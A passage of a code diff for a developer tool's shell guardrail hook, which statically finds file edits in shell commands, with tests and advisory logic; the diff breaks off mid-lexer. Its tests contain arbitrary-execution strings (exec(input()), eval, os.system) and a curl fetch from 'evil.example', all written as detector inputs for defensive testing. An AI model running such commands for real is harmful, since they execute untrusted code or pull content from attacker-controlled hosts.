+    fs.mkdirSync(path.join(dir, "tools"), { recursive: true });
+    fs.writeFileSync(path.join(dir, "tools", "gen.py"), "open('src/named.py', 'w').write('x')\n");
+    fs.writeFileSync(
+      path.join(dir, "build.js"),
+      "require('fs').writeFileSync('src/built.js', 'x');\n",
+    );
+
+    expect(advise(`python3 -c "open('src/inline.py','w').write('x')"`, dir).text).toContain(
+      "src/inline.py",
+    );
+    expect(
+      advise(`node -e "require('fs').writeFileSync('src/inline.js','x')"`, dir).text,
+    ).toContain("src/inline.js");
+    expect(
+      advise("python3 - <<'EOF'\nopen('src/heredoc.py','w').write('x')\nEOF", dir).text,
+    ).toContain("src/heredoc.py");
+    expect(advise("python3 tools/gen.py", dir).text).toContain("src/named.py");
+    expect(advise("node build.js", dir).text).toContain("src/built.js");
+
+    // Read-only variants are silent.
+    expect(advise(`python3 -c "print(open('src/a.ts').read())"`, dir).text).toBe("");
+    expect(
+      advise(`node -e "console.log(require('fs').readFileSync('a.ts','utf8'))"`, dir).text,
+    ).toBe("");
+  });
+
+  it("requires a positive whole-program reader grammar", () => {
+    const dir = workDir("reader");
+    // No writer recognized is NOT read-only: each of these has an unknown effect.
+    const unknown = [
+      `python3 -c "import subprocess; subprocess.run(['sh', 'x'])"`,
+      `python3 -c "exec(input())"`,
+      `python3 -c "import helper"`,
+      `python3 -c "for i in range(3): print(i)"`,
+      `node -e "eval(process.argv[1])"`,
+      `node -e "require('child_process').execSync(process.argv[1])"`,
+      `node -e "require('./local')"`,
+    ];
+    for (const command of unknown) {
+      const r = advise(command, dir);
+      expect({ command, uncertain: UNCERTAIN.test(r.text) }).toEqual({ command, uncertain: true });
+      expect(r.permission).toBe("allow");
+    }
+    // Inside the supported grammar (literals, bindings, direct reads, stdout) stays quiet.
+    for (const command of [
+      `python3 -c "x = 1; print(x)"`,
+      `python3 -c "print('hello')  # note"`,
+      `node -e "console.log(1 + 1)"`,
+    ]) {
+      expect({ command, text: advise(command, dir).text }).toEqual({ command, text: "" });
+    }
+  });
+
+  it("retains exact targets beside uncertain script effects", () => {
+    const dir = workDir("mixed");
+    const env = { ...process.env, BKIT_TEST_SECRET_MARK: "s3cr3t-mark-7731" };
+    const r = advise(
+      `python3 -c "import os; open('src/known.ts','w').write(os.environ['BKIT_TEST_SECRET_MARK']); os.system(os.environ['CMD'])"`,
+      dir,
+      env,
+    );
+    expect(r.text).toContain("src/known.ts");
+    expect(r.text).toMatch(UNCERTAIN);
+    // The reason is safe: no source text, command text or environment value in the output.
+    expect(r.raw).not.toContain("s3cr3t-mark-7731");
+    expect(r.raw).not.toContain("os.system");
+    expect(r.raw).not.toContain("BKIT_TEST_SECRET_MARK");
+    expect(r.raw).not.toContain("os.environ");
+    // The hook leaves no state holding the command text either.
+    const leaked = fs
+      .readdirSync(GENERATED, { recursive: true })
+      .map(String)
+      .filter((f) => fs.statSync(path.join(GENERATED, f)).isFile())
+      .filter((f) =>
+        fs.readFileSync(path.join(GENERATED, f), "utf-8").includes("s3cr3t-mark-7731"),
+      );
+    expect(leaked).toEqual([]);
+  });
+
+  it("bounds direct source inspection without executing it", () => {
+    const dir = workDir("bound");
+    const sentinel = path.join(dir, "sentinel.txt");
+    fs.writeFileSync(
+      path.join(dir, "run.js"),
+      `require('fs').writeFileSync(${JSON.stringify(sentinel)}, 'ran');\nrequire('fs').writeFileSync('src/s.ts', 'x');\n`,
+    );
+    // The named script is read, never run.
+    expect(advise("node run.js", dir).text).toContain("src/s.ts");
+    expect(fs.existsSync(sentinel)).toBe(false);
+
+    // Unavailable or unsafe sources are uncertain and never hang the hook.
+    fs.mkdirSync(path.join(dir, "adir"));
+    fs.symlinkSync(path.join(dir, "run.js"), path.join(dir, "link.js"));
+    const fifo = path.join(dir, "pipe.js");
+    spawnSync("mkfifo", [fifo]);
+    for (const command of [
+      "node missing.js",
+      "node adir",
+      "node link.js",
+      "node pipe.js",
+      "node /dev/zero",
+    ]) {
+      const r = advise(command, dir);
+      expect({ command, uncertain: UNCERTAIN.test(r.text) }).toEqual({ command, uncertain: true });
+      expect({ command, quick: r.ms < 10_000 }).toEqual({ command, quick: true });
+    }
+    expect(fs.existsSync(sentinel)).toBe(false);
+  });
+
+  it("stops analysis at each internal bound", () => {
+    const dir = workDir("limits");
+
+    // Target count: 64 exact targets are kept, the rest are dropped with a limit reason.
+    const many = Array.from({ length: 70 }, (_, i) => `echo x > src/f${i}.ts`).join("; ");
+    const counted = advise(many, dir);
+    expect(counted.text).toContain("src/f0.ts");
+    expect(counted.text).toContain("src/f63.ts");
+    expect(counted.text).not.toContain("src/f64.ts");
+    expect(counted.text).toMatch(LIMIT);
+
+    // Depth: three levels of nested shells are followed, a fourth stops with a reason.
+    const shallow = bashC(bashC("echo x > src/deep.ts"));
+    expect(advise(shallow, dir).text).toContain("src/deep.ts");
+    const deep = `echo x > src/before-deep.ts; ${bashC(bashC(bashC(bashC(bashC("echo x > src/too-deep.ts")))))}`;
+    const deepR = advise(deep, dir);
+    expect(deepR.text).toContain("src/before-deep.ts");
+    expect(deepR.text).not.toContain("src/too-deep.ts");
+    expect(deepR.text).toMatch(LIMIT);
+
+    // Source size: 64 KiB plus one byte is over the bound.
+    fs.writeFileSync(
+      path.join(dir, "big.py"),
+      `open('src/big.py', 'w').write('x')\n# ${"a".repeat(64 * 1024)}\n`,
+    );
+    expect(advise("python3 big.py", dir).text).toMatch(LIMIT);
+
+    // Command size: 256 KiB of input is over the bound, and the hook still answers.
+    const huge = advise(`echo x > src/huge.ts; : ${"a".repeat(300 * 1024)}`, dir);
+    expect(huge.permission).toBe("allow");
+    expect(huge.text).toMatch(LIMIT);
+  });
+
+  describe("in-process evidence seams", () => {
+    type Evidence = { targets: string[]; uncertain: string[]; limit: string | null };
+    function loadEvidence(): (cmd: string, ctx: { cwd: string; root: string }) => Evidence {
+      const part = path.join(GENERATED, "shell-evidence-part.cjs");
+      fs.writeFileSync(
+        part,
+        'const fs = require("node:fs");\nconst path = require("node:path");\n' +
+          fs.readFileSync(path.resolve(".bkit/core/hooks/guardrails-shell.js"), "utf-8") +
+          "\nmodule.exports = { shellEditTargets };\n",
+      );
+      return (createRequire(import.meta.url)(part) as { shellEditTargets: never }).shellEditTargets;
+    }
+
+    it("rejects a source swapped between lstat and open", () => {
+      const dir = workDir("race");
+      fs.writeFileSync(
+        path.join(dir, "a.js"),
+        "require('fs').writeFileSync('src/raced.ts','x');\n",
+      );
+      fs.writeFileSync(path.join(dir, "b.js"), "// other file\n");
+      const evidence = loadEvidence();
+      // The CommonJS fs object is the one the loaded hook part reads; the ESM namespace is frozen.
+      const cjsFs = createRequire(import.meta.url)("node:fs") as typeof fs;
+      const realLstat = cjsFs.lstatSync;
+      const bPath = path.join(dir, "b.js");
+      // Index 1 (the swapped-in file) is chosen exactly when the path ends in a.js.
+      const spy = vi
+        .spyOn(cjsFs, "lstatSync")
+        .mockImplementation(((p: fs.PathLike, o?: object) =>
+          realLstat(
+            [p, bPath][Number(String(p).endsWith("a.js"))] as fs.PathLike,
+            o,
+          )) as typeof fs.lstatSync);
+      try {
+        const ev = evidence("node a.js", { cwd: dir, root: dir });
+        expect(ev.targets).not.toContain("src/raced.ts");
+        expect(ev.uncertain).toContain("unavailable-source");
+      } finally {
+        spy.mockRestore();
+      }
+    });
+
+    it("stops at the cooperative deadline and keeps earlier targets", () => {
+      const dir = workDir("deadline");
+      const evidence = loadEvidence();
+      const base = Date.now();
+      const spy = vi
+        .spyOn(Date, "now")
+        .mockReturnValueOnce(base)
+        .mockReturnValue(base + 1000);
+      try {
+        const ev = evidence("echo x > src/one.ts; echo x > src/two.ts; echo x > src/three.ts", {
+          cwd: dir,
+          root: dir,
+        });
+        expect(ev.limit).toBe("deadline");
+        expect(ev.targets).not.toContain("src/three.ts");
+      } finally {
+        spy.mockRestore();
+      }
+    });
+  });
+});
+
 // ---------------------------------------------------------------------------
 // Managed-block boundary — consumers own the driver (stdin read + the
 // single emit()), bkit owns only the pure decision engine.
diff --git a/.bkit/core/engine/install/modules/index.integration.test.ts b/.bkit/core/engine/install/modules/index.integration.test.ts
index e25577171..906a70326 100644
--- a/.bkit/core/engine/install/modules/index.integration.test.ts
+++ b/.bkit/core/engine/install/modules/index.integration.test.ts
@@ -951,6 +951,40 @@ describe("permissions-parity", () => {
         });
       }
     });
+
+    it("keeps existing shell consumers working with structured evidence", () => {
+      // Every consumer of the detector (Claude's direct caller, Codex, Cursor and the
+      // Antigravity adapter) must keep advising, and the advice names the exact target.
+      const cmd = "sed -i s/a/b/ src/app.ts";
+      for (const host of HOSTS) {
+        const text = advisoryText(host, cmd);
+        expect({ host, advised: text.includes("edits files through the shell") }).toEqual({
+          host,
+          advised: true,
+        });
+        expect({ host, names: text.includes("src/app.ts") }).toEqual({ host, names: true });
+      }
+      const res = spawnSync("node", [ANTIGRAVITY_GUARDRAILS], {
+        cwd: GENERATED,
+        input: JSON.stringify({
+          conversationId: `structured-evidence-${process.pid}-${Date.now()}`,
+          toolCall: { name: "run_command", args: { CommandLine: cmd } },
+          workspacePaths: [GENERATED],
+        }),
+        encoding: "utf-8",
+      });
+      const doc = JSON.parse(res.stdout.trim()) as { decision?: string; reason?: string };
+      expect(String(doc.reason)).toContain("edits files through the shell");
+      expect(String(doc.reason)).toContain("src/app.ts");
+
+      // A command with no detectable edit stays silent on the direct Claude caller.
+      expect(advisoryText("claude", "git status --porcelain")).toBe("");
+      // An allowed fetch beside an edit keeps both notices on the Claude caller.
+      const both = advisoryText("claude", "curl https://evil.example/x > src/fetched.ts");
+      expect(both).toContain("outbound fetch");
+      expect(both).toContain("edits files through the shell");
+      expect(both).toContain("src/fetched.ts");
+    });
   });
 
   describe("cross-host gate parity — curl / wget in a shell", () => {
diff --git a/.bkit/core/hooks/gateguard-engine.js b/.bkit/core/hooks/gateguard-engine.js
index c88b51992..84dedfab1 100644
--- a/.bkit/core/hooks/gateguard-engine.js
+++ b/.bkit/core/hooks/gateguard-engine.js
@@ -107,6 +107,27 @@ function docAuthoringAdvisory() {
   );
 }
 
+// Agent-read files: the files below `.agents/`, `.bkit/` and `docs/` plus the root agent
+// files, matching the scope `.bkit/authoring.md` states. Plan artifacts under `docs/plans/`
+// keep their own template contract and get no general reminder.
+const AGENT_READ_ROOT_FILES = new Set(["AGENTS.md", "CLAUDE.md", "GEMINI.md"]);
+
+function isAgentReadPath(filePath) {
+  const p = filePath.replace(/\\/g, "/");
+  if (AGENT_READ_ROOT_FILES.has(p.split("/").pop() || "")) return true;
+  if (p.startsWith("docs/plans/") || p.includes("/docs/plans/")) return false;
+  return ["docs/", ".agents/", ".bkit/"].some((d) => p.startsWith(d) || p.includes("/" + d));
+}
+
+// The one general authoring reminder, identical for every edit channel and host.
+function authoringReminder() {
+  return (
+    `[bkit GateGuard] Agent-read file. Before you edit it:\n` +
+    `- Find this file in \`.bkit/authoring.md\` § Which Sections Apply, and read the sections its row lists.\n` +
+    `- Follow those rules in the edit.`
+  );
+}
+
 function configAdvisory(filePath) {
   const base = path.basename(filePath);
   return (
@@ -138,6 +159,13 @@ function inProcessKey(sessionId, filePath) {
   return JSON.stringify([sessionId, filePath]);
 }
 
+// Normalized warning identity: an absolute path resolved against the call's effective
+// directory, so a relative, absolute or `..` spelling of one file shares one record.
+function normalizeIdentity(filePath, cwd) {
+  const base = typeof cwd === "string" && cwd ? cwd : process.cwd();
+  return path.resolve(base, filePath);
+}
+
 // Dedup scope: the session, narrowed to one agent when the host names it. A Claude Code
 // subagent shares its parent's session_id and carries its own agent_id.
 function dedupKey(sessionId, agentId) {
@@ -151,12 +179,17 @@ function stateFile(sessionId) {
 }
 
 // Returns the per-session warned-file map. Absent state file is the NORMAL
-// first-touch case (guarded, no throw); a corrupt file throws to the top-level
-// fail-open boundary and that one call no-ops.
+// first-touch case (guarded, no throw); a corrupt file reads as empty.
 function readState(sessionId) {
   const file = stateFile(sessionId);
   if (!fs.existsSync(file)) return { files: {} };
-  const parsed = JSON.parse(fs.readFileSync(file, "utf-8"));
+  let parsed;
+  try {
+    parsed = JSON.parse(fs.readFileSync(file, "utf-8"));
+  } catch {
+    // Unparseable state is treated as empty; the in-process set still prevents a deny loop.
+    return { files: {} };
+  }
   if (parsed && typeof parsed === "object" && parsed.files && typeof parsed.files === "object") {
     return parsed;
   }
@@ -168,10 +201,13 @@ function alreadyWarned(sessionId, filePath) {
   return Boolean(readState(sessionId).files[filePath]);
 }
 
-function markWarned(sessionId, filePath) {
+// `spelling` is the path as the host wrote it; it is recorded beside the normalized key so
+// state readers that look a file up by its original spelling still find it.
+function markWarned(sessionId, filePath, spelling) {
   fs.mkdirSync(stateDir(), { recursive: true });
   const state = readState(sessionId);
   state.files[filePath] = true;
+  if (typeof spelling === "string" && spelling) state.files[spelling] = true;
   fs.writeFileSync(stateFile(sessionId), JSON.stringify(state), "utf-8");
 }
 
@@ -190,39 +226,120 @@ function gcOldState() {
   }
 }
 
-// The advisory for the first touch of `filePath` this session, or null when GateGuard
-// is off, the path is unusable, or this session was already warned about it. Records
-// the touch. `isNewFile` picks the reuse checklist over the read-this-file checklist.
-// Fail-open: a state-file write error still returns the checklist and the process
-// remembers it, as advisory only — a deny no later call can see was given would block
-// every retry of the edit.
-function firstTouchAdvice(filePath, sessionId, isNewFile) {
+// Host-declared: true when the hook process outlives one call (the opencode plugin), so a
+// deny whose state file cannot be written is still remembered in process and cannot loop.
+function processPersists() {
+  return typeof GATEGUARD_PROCESS_PERSISTS !== "undefined" && GATEGUARD_PROCESS_PERSISTS === true;
+}
+
+// Pure preparation: the advice for the first touch of `filePath` this session, or null when
+// GateGuard is off, the path is unusable, or the session was already warned about it.
+// Writes nothing; `acknowledgeAdvice` records the touch once the advice is delivered.
+// `isNewFile` picks the reuse checklist over the read-this-file checklist.
+function prepareAdvice(filePath, sessionId, isNewFile, cwd) {
   const mode = process.env.BKIT_GATEGUARD;
   if (mode === "off") return null;
   if (!filePath || typeof filePath !== "string") return null;
 
   const sid = typeof sessionId === "string" ? sessionId : "no-session";
+  const key = normalizeIdentity(filePath, cwd);
 
   // Warn once per (session, file).
-  if (alreadyWarned(sid, filePath)) return null;
+  if (alreadyWarned(sid, key)) return null;
 
-  const gated = isGateConfig(filePath) && process.env.BKIT_ALLOW_CONFIG_EDIT !== "1";
+  const gated = isGateConfig(key) && process.env.BKIT_ALLOW_CONFIG_EDIT !== "1";
   const baseContext = gated
-    ? configAdvisory(filePath)
+    ? configAdvisory(key)
     : isNewFile
-      ? reuseChecklist(filePath)
-      : investigationChecklist(filePath);
-  const context = isDocsPath(filePath)
-    ? `${baseContext}\n\n${docAuthoringAdvisory()}`
-    : baseContext;
+      ? reuseChecklist(key)
+      : investigationChecklist(key);
+  const parts = [baseContext];
+  if (isDocsPath(key)) parts.push(docAuthoringAdvisory());
+  if (isAgentReadPath(key)) parts.push(authoringReminder());
+
+  return {
+    sid,
+    key,
+    mode: mode === "deny" ? "deny" : "advisory",
+    context: parts.join("\n\n"),
+    spelling: filePath,
+    agentRead: isAgentReadPath(key),
+  };
+}
 
+// Records a prepared touch. Fail-open: a state-file write error remembers the touch in
+// this process and returns false (not durable). Only a durable record, or a process that
+// outlives the call, can back a deny: a deny no later call can see was given would block
+// every retry of the edit.
+function acknowledgeAdvice(prepared) {
   try {
-    markWarned(sid, filePath);
+    markWarned(prepared.sid, prepared.key, prepared.spelling);
     gcOldState();
+    return true;
   } catch {
-    warnedInProcess.add(inProcessKey(sid, filePath));
-    return { mode: "advisory", context };
+    warnedInProcess.add(inProcessKey(prepared.sid, prepared.key));
+    return false;
   }
+}
+
+// The advisory for the first touch of `filePath` this session, or null. Prepares and
+// acknowledges in one step, for callers that deliver the advice themselves.
+function firstTouchAdvice(filePath, sessionId, isNewFile, cwd) {
+  const prepared = prepareAdvice(filePath, sessionId, isNewFile, cwd);
+  if (!prepared) return null;
+  const durable = acknowledgeAdvice(prepared);
+  const mode = durable || processPersists() ? prepared.mode : "advisory";
+  return { mode, context: prepared.context };
+}
+
+// Conservative per-host output budgets for delivered advice (reviewed under decision
+// `787-conservative-host-advisory-budgets`; complete-block visibility is unverified).
+const ADVICE_BUDGETS = {
+  claude: { limit: 8000, unit: "chars" },
+  codex: { limit: 2000, unit: "bytes" },
+  cursor: { limit: 2000, unit: "bytes" },
+  antigravity: { limit: 2000, unit: "bytes" },
+};
+const ADVICE_NOTICE_RESERVE = 512;
+
+function adviceSize(text, unit) {
+  return unit === "bytes" ? Buffer.byteLength(text, "utf-8") : text.length;
+}
 
-  return { mode: mode === "deny" ? "deny" : "advisory", context };
+// Delivers prepared advice blocks inside `budget`: only whole blocks, in order, with
+// `ADVICE_NOTICE_RESERVE` units kept for the omitted-target notice. Acknowledges exactly
+// the selected blocks, and only when `verified` says the route reaches the model. Returns
+// `{ mode, context }` or null when there is nothing to say.
+function deliverAdvice(blocks, budget, verified) {
+  if (blocks.length === 0) return null;
+  const sep = "\n\n";
+  const room = budget.limit - ADVICE_NOTICE_RESERVE;
+  const selected = [];
+  const omitted = [];
+  let used = 0;
+  for (const b of blocks) {
+    const cost = adviceSize(b.context, budget.unit) + (selected.length > 0 ? sep.length : 0);
+    if (used + cost <= room) {
+      selected.push(b);
+      used += cost;
+    } else {
+      omitted.push(b);
+    }
+  }
+  const texts = selected.map((b) => b.context);
+  if (omitted.length > 0) {
+    const reminder = omitted.some((b) => b.agentRead)
+      ? " Agent-read files: see `.bkit/authoring.md` § Which Sections Apply."
+      : "";
+    texts.push(
+      `[bkit GateGuard] ${omitted.length} target${omitted.length === 1 ? "" : "s"} omitted (output limit); they stay unacknowledged and are advised on a later edit.${reminder}`,
+    );
+  }
+  let mode = "advisory";
+  if (verified) {
+    let durable = true;
+    for (const b of selected) if (!acknowledgeAdvice(b)) durable = false;
+    mode = selected.length > 0 && (durable || processPersists()) ? selected[0].mode : "advisory";
+  }
+  return { mode, context: texts.join(sep) };
 }
diff --git a/.bkit/core/hooks/guardrails-shell.js b/.bkit/core/hooks/guardrails-shell.js
index 3207dba6d..9668c1a18 100644
--- a/.bkit/core/hooks/guardrails-shell.js
+++ b/.bkit/core/hooks/guardrails-shell.js
@@ -105,95 +105,1503 @@ function usesFetch(cmd) {
   });
 }
 
-/** Source-ish extensions: a redirect into one of these is plausibly a file edit. */
+// --- Shell edit evidence -----------------------------------------------------
+//
+// Lexical evidence for "this command edits files": ordered unique exact targets, an
+// independent uncertainty set and at most one analysis limit. Nothing is executed. Files
+// named directly (a patch, a script) are read through bounded descriptors.
+
+/** Source-ish extensions: a write into one of these is plausibly a file edit. */
 const SOURCE_EXT_RE =
-  /\.(ts|tsx|js|jsx|cjs|mjs|json|md|sh|bash|py|rb|go|rs|java|css|scss|html|ya?ml|toml|sql)$/i;
+  /\.(ts|tsx|js|jsx|cjs|mjs|json|jsonl|md|sh|bash|py|rb|go|rs|java|css|scss|html|ya?ml|toml|sql)$/i;
+
+/** Agent-read locations an edit reaches even without a source extension. */
+const EVIDENCE_AGENT_READ_RE =
+  /(?:^|\/)(?:\.agents|\.bkit)\/|(?:^|\/)(?:AGENTS|CLAUDE|GEMINI)\.md$/;
+
+const EVIDENCE_LIMITS = {
+  commandBytes: 256 * 1024,
+  sourceBytes: 64 * 1024,
+  depth: 3,
+  targets: 64,
+  deadlineMs: 200,
+};
+
+/** The call context a hook passes: effective directory and the workspace root. */
+function hookContext(payload) {
+  const p = payload && typeof payload === "object" ? payload : {};
+  const roots = Array.isArray(p.workspace_roots) ? p.workspace_roots : [];
+  const root = roots.find((r) => typeof r === "string" && r) || undefined;
+  const cwd = typeof p.cwd === "string" && p.cwd ? p.cwd : undefined;
+  return { cwd, root };
+}
+
+function newEvidence(ctx) {
+  const cwd = path.resolve((ctx && ctx.cwd) || process.cwd());
+  const root = path.resolve((ctx && ctx.root) || (ctx && ctx.cwd) || process.cwd());
+  return {
+    root,
+    baseCwd: cwd,
+    targets: [],
+    seen: new Set(),
+    uncertain: new Set(),
+    limit: null,
+    halted: false,
+    commands: 0,
+    deadline: Date.now() + EVIDENCE_LIMITS.deadlineMs,
+  };
+}
+
+/** Record the first limit; `halt` stops all further analysis (a prefix is kept). */
+function evidenceLimit(st, reason, halt = true) {
+  if (!st.limit) st.limit = reason;
+  if (halt) st.halted = true;
+}
+
+function evidenceExpired(st) {
+  if (st.halted) return true;
+  if (Date.now() > st.deadline) {
+    evidenceLimit(st, "deadline");
+    return true;
+  }
+  return false;
+}
+
+function isQuietLiteral(literal) {
+  return (
+    /^\/(dev|tmp|var\/folders|var\/tmp)\//.test(literal) ||
+    /\.(log|bak|tmp|out|err|orig)$/i.test(literal)
+  );
+}
+
+function insideRoot(st, abs) {
+  const rel = path.relative(st.root, abs);
+  return rel !== ".." && !rel.startsWith(".." + path.sep) && !path.isAbsolute(rel);
+}
 
 /**
- * Targets of every unquoted `>` / `>>` redirect in a command line. A `>` inside single
- * or double quotes is text (`rg 'a > b.ts'`), a backslash-escaped `>` is a literal, and
- * `2>`, `&>` and `>&` forms (fd redirects) are not file targets.
+ * Add one literal target. `force` skips the source-extension filter (in-place editors,
+ * patches and scripts name files whatever their extension). A relative target under an
+ * unresolved directory is uncertainty, never a guessed path.
  */
-function redirectTargets(text) {
-  const targets = [];
+function addEvidenceTarget(st, literal, cwd, force) {
+  if (evidenceExpired(st) || !literal) return;
+  if (!force && !SOURCE_EXT_RE.test(literal) && !EVIDENCE_AGENT_READ_RE.test(literal)) return;
+  if (/\.(log|bak|tmp|out|err|orig)$/i.test(literal)) return;
+  if (cwd === null && !path.isAbsolute(literal)) {
+    st.uncertain.add("unresolved-directory");
+    return;
+  }
+  const abs = path.resolve(cwd === null ? path.sep : cwd, literal);
+  if (isQuietLiteral(literal) && !insideRoot(st, abs)) return;
+  const shown = insideRoot(st, abs) ? path.relative(st.root, abs).split(path.sep).join("/") : abs;
+  if (st.seen.has(shown)) return;
+  if (st.targets.length >= EVIDENCE_LIMITS.targets) {
+    evidenceLimit(st, "target-count");
+    return;
+  }
+  st.seen.add(shown);
+  st.targets.push(shown);
+}
+
+/** A target word: dynamic ones are uncertain when they could name a source file. */
+function addWordTarget(st, cmd, text, cwd, force) {
+  if (cmd.dyn.has(text)) {
+    if (force || SOURCE_EXT_RE.test(text.replace(/\u0000/g, ""))) {
+      if (!/^\$[A-Za-z_{][A-Za-z0-9_}]*$/.test(text) || force)
+        st.uncertain.add("unresolved-target");
+    }
+    return;
+  }
+  addEvidenceTarget(st, text, cwd, force);
+}
+
+// --- Lexer -------------------------------------------------------------------
+
+/** Matching `)` of a `$(` whose body starts at `from`; quotes and nesting aware. */
+function matchParen(text, from) {
+  let depth = 1;
   let quote = "";
-  for (let i = 0; i < text.length; i++) {
+  for (let i = from; i < text.length; i++) {
     const ch = text[i];
     if (quote) {
-      if (ch === quote) quote = "";
-      else if (ch === "\\" && quote === '"') i++;
+      if (ch === "\\" && quote === '"') i++;
+      else if (ch === quote) quote = "";
+      continue;
+    }
+    if (ch === "\\") i++;
+    else if (ch === "'" || ch === '"') quote = ch;
+    else if (ch === "(") depth++;
+    else if (ch === ")" && --depth === 0) return i;
+  }
+  return text.length;
+}
+
+/**
+ * Parse `text` into command items: `{ kind: "cmd", words, dyn, redirects, heredoc,
+ * stdinFile, hereString, piped }` plus `open` / `close` scope markers around subshells and
+ * substitutions. Quotes, escapes, comments, heredoc bodies and substitutions are honoured.
+ */
+function lexShell(text, st, depth) {
+  const items = [];
+  let cmd = newLexCommand();
+  let cur = newLexWord();
+  let pending = null;
+  let pipedFromPrev = false;
+  const heredocs = [];
+
+  function newLexCommand() {
+    return {
+      kind: "cmd",
+      words: [],
+      dyn: new Set(),
+      redirects: [],
+      heredoc: null,
+      stdinFile: null,
+      hereString: null,
+      piped: false,
+    };
+  }
+  function newLexWord() {
+    return { t: "", started: false, dyn: false, quoted: false, digits: true };
+  }
+  function pushWord() {
+    if (!cur.started) return;
+    const word = cur;
+    cur = newLexWord();
+    if (word.dyn) cmd.dyn.add(word.t);
+    if (pending) {
+      const r = pending;
+      pending = null;
+      if (r.op === "<<") heredocs.push({ cmd, delim: word.t, quoted: word.quoted, strip: r.strip });
+      else if (r.op === "<") cmd.stdinFile = word.t;
+      else if (r.op === "<<<") cmd.hereString = word.t;
+      else if (r.op === ">" && !r.ignore) cmd.redirects.push(word.t);
+      return;
+    }
+    cmd.words.push(word.t);
+  }
+  function endCommand(pipe) {
+    pushWord();
+    pending = null;
+    if (cmd.words.length > 0 || cmd.redirects.length > 0 || cmd.stdinFile || cmd.heredoc) {
+      cmd.piped = pipedFromPrev;
+      items.push(cmd);
+    }
+    pipedFromPrev = pipe;
+    cmd = newLexCommand();
+  }
+  function subshell(body) {
+    if (depth + 1 > EVIDENCE_LIMITS.depth) {
+      evidenceLimit(st, "depth");
+      return;
+    }
+    items.push({ kind: "open" });
+    items.push(...lexShell(body, st, depth + 1));
+    items.push({ kind: "close" });
+  }
+  function add(ch) {
+    cur.t += ch;
+    cur.started = true;
+    if (!/\d/.test(ch)) cur.digits = false;
+  }
+  function expansion(i, inDouble) {
+    // text[i] === "$"; returns the index of the last consumed char.
+    const next = text[i + 1];
+    if (next === "(") {
+      const end = matchParen(text, i + 2);
+      if (text[i + 2] !== "(") subshell(text.slice(i + 2, end));
+      cur.dyn = true;
+      cur.t += "\u0000";
+      cur.started = true;
+      cur.digits = false;
+      return end;
+    }
+    if (next === "{") {
+      const end = text.indexOf("}", i + 2);
+      cur.dyn = true;
+      cur.t += text.slice(i, end < 0 ? text.length : end + 1);
+      cur.started = true;
+      cur.digits = false;
+      return end < 0 ? text.length : end;
+    }
+    if (next && /[A-Za-z0-9_@*#?!-]/.test(next)) cur.dyn = true;
+    add("$");
+    return i;
+  }
+  function backtick(i) {
+    const end = text.indexOf("`", i + 1);
+    subshell(text.slice(i + 1, end < 0 ? text.length : end));
+    cur.dyn = true;
+    cur.t += "\u0000";
+    cur.started = true;
+    cur.digits = false;
+    return end < 0 ? text.length : end;
+  }
+  function readHeredocBodies(from) {
+    let i = from;
+    for (const h of heredocs.splice(0)) {
+      const lines = [];
+      while (i < text.length) {
+        let eol = text.indexOf("\n", i);
+        if (eol < 0) eol = text.length;
+        const line = text.slice(i, eol);
+        i = Math.min(eol + 1, text.length);
+        if ((h.strip ? line.replace(/^\t+/, "") : line) === h.delim) break;
+        lines.push(line);
+      }
+      h.cmd.heredoc = { body: lines.join("\n"), quoted: h.quoted };
+    }
+    return i;
+  }
+
+  for (let i = 0; i < text.length; i++) {
+    if (i % 512 === 0 && evidenceExpired(st)) break;
+    const ch = text[i];
+    if (ch === "\\") {
+      if (text[i + 1] === "\n") {
+        i++;
+        continue;
+      }
+      if (i + 1 < text.length) add(text[++i]);
+      cur.quoted = true;
+      continue;
+    }
+    if (ch === "'") {
+      const end = text.indexOf("'", i + 1);
+      cur.t += text.slice(i + 1, end < 0 ? text.length : end);
+      cur.started = true;
+      cur.quoted = true;
+      cur.digits = false;
+      i = end < 0 ? text.length : end;
       continue;
     }
-    if (ch === "'" || ch === '"') quote = ch;
-    else if (ch === "\\") i++;
-    else if (ch === ">") {
-      const prev = text[i - 1] ?? "";
+    if (ch === '"') {
+      cur.started = true;
+      cur.quoted = true;
+      cur.digits = false;
       let j = i + 1;
-      if (text[j] === ">") j++;
-      const fdOrAmp = /[>&\d]/.test(prev);
-      i = j - 1;
-      if (fdOrAmp) continue;
-      while (/\s/.test(text[j] ?? "")) j++;
-      const open = text[j];
-      let target = "";
-      if (open === '"' || open === "'") {
-        const end = text.indexOf(open, j + 1);
-        target = end < 0 ? "" : text.slice(j + 1, end);
-        i = end < 0 ? text.length : end;
+      for (; j < text.length && text[j] !== '"'; j++) {
+        const c = text[j];
+        if (c === "\\" && j + 1 < text.length) {
+          const n = text[j + 1];
+          if (n === "\n") j++;
+          else if (/["\\$`]/.test(n)) cur.t += text[++j];
+          else cur.t += c;
+        } else if (c === "$") j = expansion(j, true);
+        else if (c === "`") j = backtick(j);
+        else cur.t += c;
+      }
+      i = j;
+      continue;
+    }
+    if (ch === "`") {
+      i = backtick(i);
+      continue;
+    }
+    if (ch === "$") {
+      i = expansion(i, false);
+      continue;
+    }
+    if (ch === "#" && !cur.started) {
+      const eol = text.indexOf("\n", i);
+      i = eol < 0 ? text.length : eol - 1;
+      continue;
+    }
+    if (ch === "\n") {
+      endCommand(false);
+      i = readHeredocBodies(i + 1) - 1;
+      continue;
+    }
+    if (/\s/.test(ch)) {
+      pushWord();
+      continue;
+    }
+    if (ch === ";") {
+      endCommand(false);
+      continue;
+    }
+    if (ch === "&") {
+      if (text[i + 1] === "&") {
+        endCommand(false);
+        i++;
+      } else if (text[i + 1] === ">") {
+        pushWord();
+        pending = { op: ">", ignore: true };
+        i += text[i + 2] === ">" ? 2 : 1;
       } else {
-        const m = /^[^\s;|&<>]+/.exec(text.slice(j));
-        target = m ? m[0] : "";
-        i = j + target.length - 1;
+        endCommand(false);
+      }
+      continue;
+    }
+    if (ch === "|") {
+      endCommand(true);
+      if (text[i + 1] === "|") {
+        pipedFromPrev = false;
+        i++;
+      } else if (text[i + 1] === "&") i++;
+      continue;
+    }
+    if (ch === "(" || ch === ")") {
+      endCommand(false);
+      items.push({ kind: ch === "(" ? "open" : "close" });
+      continue;
+    }
+    if (ch === ">" || ch === "<") {
+      let fd = false;
+      if (cur.started && cur.digits && !cur.quoted) {
+        fd = true;
+        cur = newLexWord();
+      } else pushWord();
+      let op = ch;
+      let strip = false;
+      let ignore = fd;
+      let j = i + 1;
+      if (ch === ">") {
+        if (text[j] === ">" || text[j] === "|") j++;
+        else if (text[j] === "&") {
+          ignore = true;
+          j++;
+        }
+      } else if (text[j] === "<") {
+        j++;
+        if (text[j] === "<") {
